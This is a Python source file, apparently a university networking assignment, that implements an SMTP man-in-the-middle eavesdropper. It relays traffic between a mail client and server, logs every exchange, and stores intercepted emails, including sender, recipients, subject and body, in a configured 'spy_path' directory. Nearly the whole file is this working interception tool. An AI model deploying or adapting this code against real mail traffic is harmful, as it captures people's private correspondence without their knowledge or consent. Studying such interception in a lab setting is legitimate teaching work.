import os
import socket
import sys
from dataclasses import dataclass
import datetime
import re


@dataclass(frozen=False)
class Email:
    """
    A dataclass containing all necessary information to send a plain text email.
    """
    from_user: str
    """The sender of the email."""

    recipients: list[str]
    """All recipients of the email as a list."""

    date: str
    """The date the email was sent. (may be empty)"""

    subject: str
    """The subject of the email. (may be empty)"""

    body: list[str]
    """The body of the email as a list."""

    def store_email(self, filepath: str, filename: str = "unknown.txt") -> None:
        """
        Puts the email into a file and stores it.
        """
        with open(f"{os.path.expanduser(filepath)}/{filename}", 'w') as file:
            # Writing sender
            file.write(f"From: {self.from_user}\n")

            # Writing recipient(s)
            file.write("To: ")
            for count, recipient in enumerate(self.recipients):
                if count == len(self.recipients) - 1:
                    file.write(f"{recipient}\n")
                else:
                    file.write(f"{recipient},")
            
            # Writing date
            file.write(f"Date: {self.date}\n")

            # Writing subject
            file.write(f"{self.subject}\n")

            # Writing body
            for line in self.body:
                file.write(f"{line}\n")


def real_server_print(line: str) -> str:
    """Prints given string to stdout, prepending it with S: """
    arr = line.rstrip().split('\r\n')
    to_print = ""
    for string in arr:
        to_print += f"S: {string}\r\n"
    return to_print


def real_client_print(line: str) -> str:
    """Prints given string to stdout, prepending it with C: """
    arr = line.rstrip().split('\r\n')
    to_print = ""
    for string in arr:
        to_print += f"C: {string}\r\n"
    return to_print


def fake_server_print(line: str) -> str:
    """Prints given string to stdout, prepending it with AS: """
    arr = line.rstrip().split('\r\n')
    to_print = ""
    for string in arr:
        to_print += f"AS: {string}\r\n"
    return to_print


def fake_client_print(line: str) -> str:
    """Prints given string to stdout, prepending it with AC: """
    arr = line.rstrip().split('\r\n')
    to_print = ""
    for string in arr:
        to_print += f"AC: {string}\r\n"
    return to_print


def check_from_email(email: str) -> bool:
    """Checks the given MAIL FROM string according to the specification."""
    if re.match(r"MAIL FROM:<[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-)*(?:.[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-)*)@[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-[A-Za-z0-9])*\.[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-)*>", email):
        return True
    else:
        return False


def check_to_email(email: str) -> bool:
    """Checks the given RCPT TO string according to the specification."""
    if re.match(r"RCPT TO:<[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-)*(?:.[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-)*)@[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-[A-Za-z0-9])*\.[A-Za-z0-9][A-Za-z0-9]*(?:[A-Za-z0-9]|-)*>", email):
        return True
    else:
        return False


def check_date(date: str) -> bool:
    """
    Checks the format of date.

    Args:
        date: string variable with just the date, no special characters.

    Returns:
        boolean to indicate whether the date is valid or not.
    """
    try:
        date_format = datetime.datetime.strptime(date, "%a, %d %b %Y %X %z")
        return True
    except ValueError:
        return False


def parse_config_file() -> dict:
    """
    Reads command line arguments and parses the config file.

    Returns:
        connection_info: dictionary with all the information from the config file
            server_port: the port the server listens on
            inbox_path: the filepath where email files are to be stored
    """
    if len(sys.argv) == 1:
        print("no config file given")
        sys.exit(1)
    else:
        filepath = sys.argv[1]
    if not os.access(filepath, os.R_OK):
        print("can't access config file")
        sys.exit(2)
    temp_dict = {}
    try:
        with open(filepath) as file:
            for line in file:
                line = line.strip()
                arr = line.split('=')
                if arr[0] == "server_port":
                    temp_dict.update({"server_port": int(arr[1])})
                elif arr[0] == "client_port":
                    temp_dict.update({"client_port": int(arr[1])})
                elif arr[0] == "spy_path":
                    temp_dict.update({"spy_path": arr[1]})
            if len(temp_dict) != 3:
                print("incomplete config file")
                sys.exit(2)
        return temp_dict
    except FileNotFoundError:
        print("config not found")
        sys.exit(1)

connection_info = parse_config_file()
"""
Dictionary that has all the information from the config file provided.
    server_port: the port the server listens on
    inbox_path: the filepath where email files are to be stored
"""


def check_status_code(line: str, expected: int) -> bool:
    """
    Checks the status code of message received by server against expected code.

    Args:
        line: the whole message received ƒrom server
        expected: the integer status code to check the message against
    """
    if int(line[:3]) == expected:
        return True
    return False

## All receiving and sending functions. Logging is included
def receive_from_client(client) -> str:
    """Responsible for receiving message from client, logging it, decoding it and then returning it as a string."""
    received = client.recv(1024).decode('ascii')
    if not received:
        print("AS: Connection lost\r\n", end="", flush=True)
        client.close()
        sys.exit(0)
    print(real_client_print(received), end="", flush=True)
    print(fake_server_print(received), end="", flush=True)
    return received


def send_to_server(server: socket.socket, message: str) -> None:
    """Responsible for sending message to server."""
    server.send(message.encode('ascii'))


def receive_from_server(server: socket.socket) -> str:
    """Responsible for receiving message from server, logging it, decoding it and then returning it as a string."""
    received = server.recv(1024).decode('ascii')
    if not received:
        print("AS: Connection lost\r\n", end="", flush=True)
        server.close()
        sys.exit(0)
    print(real_server_print(received), end="", flush=True)
    print(fake_client_print(received), end="", flush=True)
    return received


def send_to_client(client: socket.socket, message: str) -> None:
    """Responsible for sending message to client."""
    client.send(message.encode('ascii'))


def execute_eavesdropping(server_tuple: tuple[socket.socket, str], sock: socket.socket) -> None:
    """Primary function of the program, executes the whole flow of the eavesdropper and the MITM attack.
    
    Args:
        server_tuple: tuple containing the server socket and the first string received from server
        sock: the client socket object, listens for client connection
    """
    from_user = ''
    to_users = []
    date = ''
    subject = ''
    body = []

    # Allowing a queue of 1 connections
    sock.listen(1)
    # Handling incoming connections
    client, address = sock.accept()

    server = server_tuple[0]
    recv = server_tuple[1] # first message sent by server
    print(real_server_print(recv), end='', flush=True)
    print(fake_client_print(recv), end='', flush=True)
    client.send(recv.encode('ascii')) # send message to client

    data_started = False
    while True:
        request = receive_from_client(client) # Step 1
        send_to_server(server, request) # Step 2
        
        reply = receive_from_server(server) # Step 3
        send_to_client(client, reply) # Step 4

        # Check status code and store "one" in variable if necessary
        if request[:9] == "MAIL FROM":
            if check_status_code(reply, 250):
                from_user = request.strip().split(":")[1]
        elif request[:7] == "RCPT TO":
            if check_status_code(reply, 250):
                to_users.append(request.strip().split(":")[1])
        elif request[:4] == "DATA":
            if check_status_code(reply, 354):
                data_started = True
        elif request[:4] == "Date":
            if check_status_code(reply, 354):
                date = request.strip().split(": ")[1]
        elif request[:7] == "Subject":
            if check_status_code(reply, 354):
                subject = request.strip()
        elif data_started and check_status_code(reply, 354):
            body.append(request.strip())
        elif request[0] == ".":
            if check_status_code(reply, 250):
                data_started = False
                email = Email(from_user, to_users, date, subject, body)
                if date != '':
                    # Mon, 14 Sep 1987 23:07:00 +1000
                    date_format = datetime.datetime.strptime(date, "%a, %d %b %Y %X %z")
                    unix_time = datetime.datetime.timestamp(date_format)
                    email.store_email(connection_info['spy_path'], str(int(unix_time))+".txt")
                else:
                    email.store_email(connection_info['spy_path'])
        elif request[:4] == "QUIT":
            if check_status_code(reply, 221):
                client.close()
                server.close()
                sys.exit(0)


def setup_socket_for_client() -> socket.socket:
    """
    Sets up a client socket connection to the server for communication over a network. If 
    the client cannot connect, after 20 seconds, the program automatically exits with an error.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # allows us to relaunch the application quickly without having to worry about "address already 
    # in use errors"
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Sets timeout of socket: we will use this to check if we can connect to the server
    sock.settimeout(20)

    # Start listening for connections
    sock.bind((socket.gethostname(), connection_info["client_port"]))
    
    return sock


def setup_socket_for_server() -> tuple[socket.socket, str]:
    """
    Sets up a client socket connection to the server for communication over a network. If 
    the client cannot connect, after 20 seconds, the program automatically exits with an error.

    Returns:
        A client socket connected to the USYD mail server.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # allows us to relaunch the application quickly without having to worry about "address already 
    # in use errors"
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Sets timeout of socket: we will use this to check if we can connect to the server
    sock.settimeout(20)

    try:
        # Connect to server
        sock.connect((socket.gethostname(), connection_info["server_port"]))
        recv = sock.recv(1024).decode('ascii')
        # if recv[:3] != "220":
        #     print('C: Cannot establish connection\r')
        #     sys.exit(3)
    except socket.error:
        print("C: Cannot establish connection\r")
        sys.exit(3)

    return (sock, recv)


def main():
    """Main method of the program."""
    client = setup_socket_for_client() # acting server binds to client port to get messages from client
    server_tuple = setup_socket_for_server() # acting client connects to server port to get messages from server
    execute_eavesdropping(server_tuple, client)


if __name__ == '__main__':
    main()